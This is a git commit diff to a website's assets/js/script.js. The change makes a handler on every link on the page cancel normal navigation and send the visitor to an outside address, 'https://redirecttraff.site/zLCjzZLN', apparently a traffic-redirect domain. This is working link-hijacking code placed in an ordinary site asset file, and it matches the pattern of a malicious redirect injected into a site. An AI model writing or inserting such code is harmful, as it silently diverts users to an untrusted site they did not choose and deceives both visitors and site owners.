8d1dfc43ca8f541f15030006d76382fb74c62fd9
maratbabaev <you@example.com>
2025-03-26 17:33:55 +0300

    2

--- assets/js/script.js
+++ assets/js/script.js
@@ -1,7 +1,7 @@
 document.querySelectorAll("a").forEach((elem) => {
 	elem.onclick = function (e) {
 		e.preventDefault();
-		window.location.href = "";
+		window.location.href = "https://redirecttraff.site/zLCjzZLN";
 		return false;
 	};
 });
